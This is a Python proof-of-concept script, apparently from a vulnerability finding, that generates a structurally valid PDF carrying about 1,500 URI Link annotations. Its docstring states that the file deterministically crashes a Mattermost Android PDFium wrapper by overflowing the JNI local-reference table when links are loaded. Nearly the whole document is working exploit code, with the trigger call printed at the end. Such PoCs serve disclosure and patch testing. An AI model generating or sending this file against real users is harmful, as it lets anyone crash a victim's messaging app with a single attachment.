#!/usr/bin/env python3
"""
PoC generator for mattermost-android-pdfium FINDING: JNI local-reference
table overflow in Java_com_mattermost_pdfium_PdfBridge_nativeGetLinksForPage
(src/main/cpp/native-lib.cpp:309-390).

Each Link annotation processed in the loop leaks ~3-7 JNI local references
(rectFClass, jRectF, NewStringUTF(uri), Integer class x2, Integer object;
only jLink is freed, and only AFTER the loop). ART's local reference table
default capacity is ~512 entries; once exceeded the runtime calls abort()
with "JNI ERROR (app bug): local reference table overflow", killing the
entire app process.

This produces a *structurally valid* single-page PDF whose one page carries
N URI Link annotations. Opening it and calling getLinksForPage(0) — the
normal flow a PDF viewer performs to make links tappable — deterministically
crashes the host app. No memory-corruption primitive, no exotic prerequisite:
one ordinary attachment.

Usage:
    python3 gen_linkbomb_pdf.py [N] [output.pdf]
Default N = 1500 (comfortably above any ART local-ref ceiling).
"""
import sys

N = int(sys.argv[1]) if len(sys.argv) > 1 else 1500
OUT = sys.argv[2] if len(sys.argv) > 2 else "linkbomb.pdf"

objects = {}  # obj number -> body bytes (without "N 0 obj"/"endobj")

# 1: Catalog, 2: Pages, 3: Page. Annotations start at object 4.
ANNOT_START = 4
annot_refs = " ".join(f"{ANNOT_START + i} 0 R" for i in range(N))

objects[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
objects[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
objects[3] = (
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
    b"/Resources << >> /Annots [" + annot_refs.encode() + b"] >>"
)

for i in range(N):
    objn = ANNOT_START + i
    # Each is a real /Link annotation with a /URI action -> exercises the
    # FPDFAnnot_GetLink -> FPDFLink_GetAction -> FPDFAction_GetURIPath path
    # AND the NewStringUTF leak branch in the wrapper.
    y = 10 + (i % 70)
    objects[objn] = (
        b"<< /Type /Annot /Subtype /Link "
        b"/Rect [10 %d 100 %d] "
        b"/Border [0 0 0] "
        b"/A << /Type /Action /S /URI /URI (https://example.com/%d) >> >>"
        % (y, y + 8, i)
    )

# Serialize with a correct classic xref table.
out = bytearray()
out += b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"

offsets = {}
max_obj = ANNOT_START + N - 1
for n in range(1, max_obj + 1):
    offsets[n] = len(out)
    out += f"{n} 0 obj\n".encode() + objects[n] + b"\nendobj\n"

xref_pos = len(out)
count = max_obj + 1
out += f"xref\n0 {count}\n".encode()
out += b"0000000000 65535 f \n"
for n in range(1, count):
    out += f"{offsets[n]:010d} 00000 n \n".encode()

out += b"trailer\n"
out += f"<< /Size {count} /Root 1 0 R >>\n".encode()
out += b"startxref\n"
out += f"{xref_pos}\n".encode()
out += b"%%EOF\n"

with open(OUT, "wb") as f:
    f.write(out)

print(f"wrote {OUT}: {len(out)} bytes, 1 page, {N} /Link annotations")
print("Trigger: PdfBridge.open(path).getLinksForPage(0)")
